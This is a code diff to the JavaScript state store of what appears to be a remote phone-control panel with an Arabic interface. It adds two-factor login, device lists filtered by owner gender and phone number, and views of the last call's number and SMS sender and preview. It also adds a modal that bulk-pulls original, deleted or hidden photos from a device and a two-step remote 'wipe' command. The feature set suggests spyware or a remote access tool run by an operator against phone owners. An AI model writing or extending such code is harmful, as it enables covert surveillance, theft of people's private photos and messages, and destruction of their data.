@@ -10,6 +10,7 @@ export function parseRoute(hash) {
   const clean = (hash || "#/login").replace(/^#\/?/, "") || "login";
   const [pathPart, queryPart] = clean.split("?");
   const segs = pathPart.split("/").filter(Boolean);
+  if (segs[0] === "home") return { name: "home" };
   if (segs[0] === "devices" && segs[1]) {
     return { name: "device-detail", id: segs[1] };
   }
@@ -31,6 +32,13 @@ export function makePanelStore() {
     devices: [],
     detail: null,
     commandChoice: "ping",
+
+    pendingTicket: "",
+    statusFilter: "",
+    genderFilter: "",
+    search: "",
+    wipeArmed: false,
+    pullModal: { open: false, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null },
 
     listFilter: "",
     pollTimer: null,
@@ -59,24 +67,50 @@ export function makePanelStore() {
       this.cooldownTimer = null;
     },
 
-    startLogin(email, password) {
+    startLogin(username, password) {
       this.loginError = "";
       return apiFetch("/auth/login", {
         method: "POST",
-        body: JSON.stringify({ email, password }),
+        body: JSON.stringify({ username, password }),
       })
         .then((body) => {
-          setAccessToken(body.accessToken);
-          localStorage.setItem("refresh_token", body.refreshToken);
-          this.user = body.user;
-          this.show("#/devices");
+          if (body.require2fa) {
+            this.pendingTicket = body.ticket;
+            return;
+          }
+          this.finishLogin(body);
         })
         .catch((err) => {
           this.loginError =
             err instanceof ApiError && err.status === 0
               ? "تعذر الاتصال، حاول تاني"
-              : "بريد أو كلمة مرور خاطئة";
+              : "مستخدم أو كلمة مرور خاطئة";
         });
+    },
+
+    submit2fa(code) {
+      this.loginError = "";
+      return apiFetch("/auth/2fa", {
+        method: "POST",
+        body: JSON.stringify({ ticket: this.pendingTicket, code }),
+      })
+        .then((body) => {
+          this.pendingTicket = "";
+          this.finishLogin(body);
+        })
+        .catch((err) => {
+          this.loginError =
+            err instanceof ApiError && err.status === 0
+              ? "تعذر الاتصال، حاول تاني"
+              : "رمز التحقق غلط";
+        });
+    },
+
+    finishLogin(body) {
+      setAccessToken(body.accessToken);
+      localStorage.setItem("refresh_token", body.refreshToken);
+      this.user = body.user;
+      this.show("#/home");
     },
 
     show(hash) {
@@ -193,17 +227,127 @@ export function makePanelStore() {
       }
     },
 
-    async sendCommand(id, cmd) {
+    async sendCommand(id, cmd, payload) {
       try {
         await apiFetch(`/devices/${encodeURIComponent(id)}/commands`, {
           method: "POST",
-          body: JSON.stringify({ command: cmd ?? this.commandChoice }),
+          body: JSON.stringify({ command: cmd ?? this.commandChoice, ...(payload ? { payload } : {}) }),
         });
         this.flash = "تم إرسال الأمر";
         setTimeout(() => (this.flash = ""), 2500);
       } catch (err) {
         this.handleLoadError(err);
       }
+    },
+
+    /* ----------------------- list helpers ----------------------- */
+
+    /** deleted = formatted OR silent >= 7 days. */
+    isDeleted(d) {
+      if (d.formattedAt) return true;
+      const last = new Date(d.lastSeen).getTime();
+      return Date.now() - last > 7 * 86400_000;
+    },
+
+    filteredDevices() {
+      const q = this.search.trim().toLowerCase();
+      return (this.devices || [])
+        .slice()
+        .sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt))
+        .filter((d) => {
+          if (this.statusFilter === "deleted" && !this.isDeleted(d)) return false;
+          if (this.statusFilter === "online" && (this.isDeleted(d) || d.state !== "online")) return false;
+          if (this.statusFilter === "offline" && (this.isDeleted(d) || d.state === "online")) return false;
+          if (this.genderFilter && (d.gender || "") !== this.genderFilter) return false;
+          if (q && !(d.name || "").toLowerCase().includes(q) && !(d.phone || "").includes(q)) return false;
+          return true;
+        });
+    },
+
+    dotClass(d) {
+      if (this.isDeleted(d)) return "dot-red";
+      return d.state === "online" ? "dot-green" : "dot-gray";
+    },
+
+    stateLabel(d) {
+      if (this.isDeleted(d)) return "محذوف";
+      return d.state === "online" ? "متصل" : "غير متصل";
+    },
+
+    genderIcon(d) {
+      return d.gender === "female" ? "♀ أنثى" : d.gender === "male" ? "♂ ذكر" : "—";
+    },
+
+    daysWithUs(d) {
+      return Math.max(0, Math.floor((Date.now() - new Date(d.createdAt).getTime()) / 86400_000));
+    },
+
+    /* ---------------------- stats side panel --------------------- */
+
+    statOf(k) {
+      const s = this.detail?.stats;
+      return s && s[k] !== undefined && s[k] !== null ? s[k] : "—";
+    },
+
+    statText(k) {
+      const s = this.detail?.stats?.[k];
+      if (!s || typeof s !== "object") return "—";
+      if (k === "lastCall") return `${s.number || "?"} · ${s.atMs ? new Date(s.atMs).toLocaleString("ar-EG") : "?"}`;
+      return `${s.sender || "?"} · ${s.preview || ""}`.trim();
+    },
+
+    /* ------------------------ pull modal ------------------------- */
+
+    async openPullModal(id) {
+      this.pullModal = { open: true, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null };
+      try {
+        const r = await apiFetch(`/devices/${encodeURIComponent(id)}/photos`);
+        this.pullModal.counts = r.counts || {};
+        this.pullModal.items = r.items || [];
+      } catch {
+        this.pullModal.counts = {};
+      }
+    },
+
+    pullItems() {
+      const q = this.pullModal.search.trim().toLowerCase();
+      return this.pullModal.items
+        .filter((p) => p.category === this.pullModal.tab)
+        .filter((p) => !q || (p.name || "").toLowerCase().includes(q))
+        .slice(0, 60);
+    },
+
+    /** "N" | "DEL N" | "HIDE N" -> {category, limit} */
+    parsePullSpec(spec) {
+      const m = /^\s*(?:(DEL|HIDE)\s+)?(\d+)\s*$/i.exec(spec || "");
+      if (!m) return null;
+      const cat = m[1] ? { DEL: "deleted", HIDE: "hidden" }[m[1].toUpperCase()] : "original";
+      return { category: cat, limit: Math.min(2000, parseInt(m[2], 10)) };
+    },
+
+    async startPull(id) {
+      const parsed = this.parsePullSpec(this.pullModal.spec);
+      if (!parsed) {
+        this.flash = "اكتب العدد صح — مثال: 5 أو DEL 3";
+        setTimeout(() => (this.flash = ""), 2500);
+        return;
+      }
+      this.pullModal.progress = 20;
+      await this.sendCommand(id, "pull_photos", parsed);
+      this.pullModal.progress = 60;
+      setTimeout(() => { this.pullModal.progress = 100; }, 2000);
+    },
+
+    /* ------------------------- format --------------------------- */
+
+    formatWipe(id) {
+      if (!this.wipeArmed) {
+        this.wipeArmed = true;
+        setTimeout(() => (this.wipeArmed = false), 5000);
+        return;
+      }
+      this.wipeArmed = false;
+      this.sendCommand(id, "wipe");
     },
 
     flash: "",
